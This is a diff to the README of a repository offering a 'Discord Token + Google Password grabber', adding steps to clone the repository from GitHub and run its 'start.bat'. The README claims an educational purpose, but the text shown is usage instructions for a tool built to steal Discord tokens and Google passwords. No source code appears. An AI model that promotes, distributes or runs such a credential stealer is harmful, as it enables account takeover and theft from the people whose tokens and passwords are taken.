@@ -9,7 +9,11 @@ Discord Token + Google Password grabber
 This repository contains a Discord token grabber designed to help you learn about security vulnerabilities related to token management and how to better protect against them.
 
 ## Usage
-- Run the 'start.bat' file and follow the instructions there.
+1. *Clone the Repository*
+   ```bash
+   git clone https://github.com/ECCclient/Token.git
+
+2. Run the 'start.bat' file and follow the instructions there.
 
 
 
